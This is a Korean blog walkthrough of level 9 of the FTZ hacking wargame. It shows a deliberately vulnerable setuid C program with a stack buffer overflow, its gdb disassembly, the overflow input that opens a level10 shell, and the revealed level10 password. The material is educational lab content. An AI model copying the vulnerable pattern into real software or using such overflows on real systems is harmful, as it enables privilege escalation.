@@ -1,0 +1,247 @@
+I"�,<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level9 
+level9@~~~~<span class="s1">'s password: 
+[level9@ftz level9]$ ls 
+hint  public_html  tmp 
+[level9@ftz level9]$ cat hint 
+
+
+다음은 /usr/bin/bof의 소스이다. 
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt; 
+
+main(){ 
+
+  char buf2[10]; 
+  char buf[10]; 
+
+  printf("It can be overflow : "); 
+  fgets(buf,40,stdin); 
+
+  if ( strncmp(buf2, "go", 2) == 0 ) 
+   { 
+        printf("Good Skill!\n"); 
+        setreuid( 3010, 3010 ); 
+        system("/bin/bash"); 
+   } 
+
+} 
+
+이를 이용하여 level10의 권한을 얻어라. 
+
+
+[level9@ftz level9]$
+</span></code></pre></div></div>
+
+<p>level9/apple로 접속해 hint를 읽었다.</p>
+
+<p>위 소스 파일을 보니, 마침내 버퍼오버플로우가 등장했다.</p>
+
+<p>이제부터 어셈블리어의 개념이 필요하다.</p>
+
+<p>한번 나의 글을 읽어 보고, 할만 하다면 느낌대로 이해하고 못하겠다면 어셈블리를 따로 공부하는걸 추천드린다.</p>
+
+<p>C 소스 파일을 보면, buf2와 buf를 문자열 배열로 각각 10칸씩 준다.</p>
+
+<p>문제점은 fgets 함수를 실행하면서 발생한다.</p>
+
+<p>입력받는 buf배열은 10칸이지만, 입력받는 갯수는 40개.</p>
+
+<p>이것으로 버퍼오버플로우 시키는 것이다.</p>
+
+<p>만약 버퍼오버플로우의 기본 개념도 없다면, 이 파일을 읽어 보자.</p>
+
+<p><a href="https://github.com/3MP404/3MP404.github.io/files/3280963/BOF.pdf">달고나 BOF 기초문서.pdf</a></p>
+
+<p>C언어 공부를 조금 해 본 적이 있다면 금방 이해할 수 있을 것이다.</p>
+
+<p>만약 이해가 힘들다면 구글링을 해 보자.</p>
+
+<p>앞으로는 버퍼오버플로우의 기본 개념을 알고 있다고 생각하고 이야기하겠다.</p>
+
+<p>프로그램의 구동 형식을 알려면 디버깅이 필요하다.</p>
+
+<p>힌트에 있는 C소스코드를 /tmp폴더로 옮겨와 컴파일하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz level9]<span class="nv">$ </span><span class="nb">cp </span>hint /tmp/bof.c 
+<span class="o">[</span>level9@ftz level9]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>cp (복사할 파일) (붙여넣을 파일)
+아예 한번에 tmp 폴더 안에 bof.c라는 파일을 만들어 붙여넣게 하였다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
+</span>bof.c mysql.sock 
+<span class="o">[</span>level9@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>컴파일 하려면 소스파일 안의 한글을 모두 지워줘야한다.</p>
+
+<p>vi 명령어로 편집해 한글을 모두 없애자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span>vi bof.c 
+<span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>bof.c 
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt; </span>
+<span class="c">#include &lt;unistd.h&gt;</span>
+
+main<span class="o">(){</span> 
+
+  char buf2[10]<span class="p">;</span> 
+  char buf[10]<span class="p">;</span> 
+
+  <span class="nb">printf</span><span class="o">(</span><span class="s2">"It can be overflow : "</span><span class="o">)</span><span class="p">;</span> 
+  fgets<span class="o">(</span>buf,40,stdin<span class="o">)</span><span class="p">;</span> 
+
+  <span class="k">if</span> <span class="o">(</span> strncmp<span class="o">(</span>buf2, <span class="s2">"go"</span>, 2<span class="o">)</span> <span class="o">==</span> 0 <span class="o">)</span> 
+   <span class="o">{</span> 
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"Good Skill!</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span> 
+        setreuid<span class="o">(</span> 3010, 3010 <span class="o">)</span><span class="p">;</span> 
+        system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="p">;</span> 
+   <span class="o">}</span> 
+
+<span class="o">}</span> 
+<span class="o">[</span>level9@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+<p>이제 준비는 끝났다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> bof bof.c 
+<span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span>gdb bof 
+GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
+Copyright 2003 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type <span class="s2">"show copying"</span> to see the conditions. 
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
+This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>컴파일하고 dbg를 실행시켰다.</p>
+
+<p>이 gdb를 이용해 프로그램의 흐름을 읽을 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x08048420 &lt;main+0&gt;:    push   ebp 
+0x08048421 &lt;main+1&gt;:    mov    ebp,esp 
+0x08048423 &lt;main+3&gt;:    sub    esp,0x28 
+0x08048426 &lt;main+6&gt;:    and    esp,0xfffffff0 
+0x08048429 &lt;main+9&gt;:    mov    eax,0x0 
+0x0804842e &lt;main+14&gt;:   sub    esp,eax 
+0x08048430 &lt;main+16&gt;:   sub    esp,0xc 
+0x08048433 &lt;main+19&gt;:   push   0x8048554 
+0x08048438 &lt;main+24&gt;:   call   0x8048350  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x0804843d &lt;main+29&gt;:   add    esp,0x10 
+0x08048440 &lt;main+32&gt;:   sub    esp,0x4 
+0x08048443 &lt;main+35&gt;:   push   ds:0x8049698 
+0x08048449 &lt;main+41&gt;:   push   0x28 
+0x0804844b &lt;main+43&gt;:   lea    eax,[ebp-40] 
+0x0804844e &lt;main+46&gt;:   push   eax 
+0x0804844f &lt;main+47&gt;:   call   0x8048320  &lt;fgets&gt;
+0x08048454 &lt;main+52&gt;:   add    esp,0x10 
+0x08048457 &lt;main+55&gt;:   sub    esp,0x4 
+0x0804845a &lt;main+58&gt;:   push   0x2 
+0x0804845c &lt;main+60&gt;:   push   0x804856a 
+0x08048461 &lt;main+65&gt;:   lea    eax,[ebp-24] 
+0x08048464 &lt;main+68&gt;:   push   eax 
+0x08048465 &lt;main+69&gt;:   call   0x8048330  &lt;strncmp&gt;
+0x0804846a &lt;main+74&gt;:   add    esp,0x10 
+0x0804846d &lt;main+77&gt;:   <span class="nb">test   </span>eax,eax 
+0x0804846f &lt;main+79&gt;:   jne    0x80484a6 &lt;main+134&gt; 
+0x08048471 &lt;main+81&gt;:   sub    esp,0xc 
+0x08048474 &lt;main+84&gt;:   push   0x804856d 
+0x08048479 &lt;main+89&gt;:   call   0x8048350  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x0804847e &lt;main+94&gt;:   add    esp,0x10 
+0x08048481 &lt;main+97&gt;:   sub    esp,0x8 
+0x08048484 &lt;main+100&gt;:  push   0xbc2 
+0x08048489 &lt;main+105&gt;:  push   0xbc2 
+0x0804848e &lt;main+110&gt;:  call   0x8048360  &lt;setreuid&gt;
+0x08048493 &lt;main+115&gt;:  add    esp,0x10 
+0x08048496 &lt;main+118&gt;:  sub    esp,0xc 
+0x08048499 &lt;main+121&gt;:  push   0x804857a 
+0x0804849e &lt;main+126&gt;:  call   0x8048310  &lt;system&gt;
+0x080484a3 &lt;main+131&gt;:  add    esp,0x10 
+0x080484a6 &lt;main+134&gt;:  leave 
+0x080484a7 &lt;main+135&gt;:  ret 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>디버깅을 하며 옆에 C 소스코드를 같이 두며 보는것이 이해가 더 빠를 것이다.</p>
+
+<p>하나하나 살펴보자.</p>
+
+<p>가장 왼쪽의 0x~~~라고 되어 있는건 프로그램이 실행되는 주소값</p>
+
+<p>두번째는 함수부터 얼마나 떨어져 있는지 알려주는 주소값</p>
+
+<p>세번째는 어셈블리 명령어</p>
+
+<p>네번째는 실행하는 함수나 인좌 등등을 표시한다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x08048443 &lt;main+35&gt;:   push   ds:0x8049698 
+0x08048449 &lt;main+41&gt;:   push   0x28  
+0x0804844b &lt;main+43&gt;:   lea    eax,[ebp-40]  
+0x0804844e &lt;main+46&gt;:   push   eax  
+0x0804844f &lt;main+47&gt;:   call   0x8048320  &lt;fgets&gt;
+</code></pre></div></div>
+
+<p>우선 이것을 보자. C코드에서는 fgets(buf,40,stdin);의 역할을 한다.</p>
+
+<p>어셈블리에서는 C에서 보내주는 인좌의 반대 순서대로 쓰인다.</p>
+
+<p>가장 위의 main+35 :   push   ds:0x8049698 가 stdin.</p>
+
+<p>main+41 :   push   0x28  가 40.</p>
+
+<p>main+43:   lea    eax,[ebp-40] 이 buf이다.</p>
+
+<p>그러므로 buf의 주소값은 [ebp-40]이 되는 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0804845a &lt;main+58&gt;:   push   0x2 
+0x0804845c &lt;main+60&gt;:   push   0x804856a 
+0x08048461 &lt;main+65&gt;:   lea    eax,[ebp-24] 
+0x08048464 &lt;main+68&gt;:   push   eax 
+0x08048465 &lt;main+69&gt;:   call   0x8048330  &lt;strncmp&gt;
+</code></pre></div></div>
+
+<p>이것은 strncmp(buf2,”go”,2)의 기능을 한다.</p>
+
+<p>위와 같이 인좌가 거꾸로 되어 있는 것이다.</p>
+
+<p>main+58:   push   0x2 가 2.</p>
+
+<p>main+60:   push   0x804856a 가 “go”의 주소값.</p>
+
+<p>main+65:   lea    eax,[ebp-24] 가 buf2의 주소값인 것이다.</p>
+
+<p>이렇게 buf와 buf2의 주소값을 모두 알게 되었다.</p>
+
+<p>그럼 오버플로우 시켜 보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz level9]<span class="nv">$ </span><span class="nb">cd</span> /usr/bin 
+<span class="o">[</span>level9@ftz bin]<span class="nv">$ </span>./bof 
+It can be overflow : aaaaaaaaaaaaaaaago 
+Good Skill! 
+<span class="o">[</span>level10@ftz bin]<span class="err">$</span>
+</code></pre></div></div>
+<p>buf2의 주소 : ebp-24
+buf의 주소 : ebp-40</p>
+
+<p>buf 와 buf2의 주소값 차이는 16차이가 난다.</p>
+
+<p>그러므로 아무런 값이나 16개를  채워 넣고, 조건문을 보면 /bin/bash명령이 실행되기 위해 buf2가 “go”가 되어야 하므로 go를 붙여 주는 것이다.</p>
+
+<p>실제로 level10이 된 것을 볼 수 있다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level10@ftz bin]<span class="nv">$ </span>my-pass  
+Level10 Password is <span class="s2">"interesting to hack!"</span><span class="nb">.</span>  
+<span class="o">[</span>level10@ftz bin]<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>my-pass 명령어로 level10의 비밀번호를 알아냈다.</p>
+
+<p>level10’s password:”interesting to hack!”</p>
+:ET
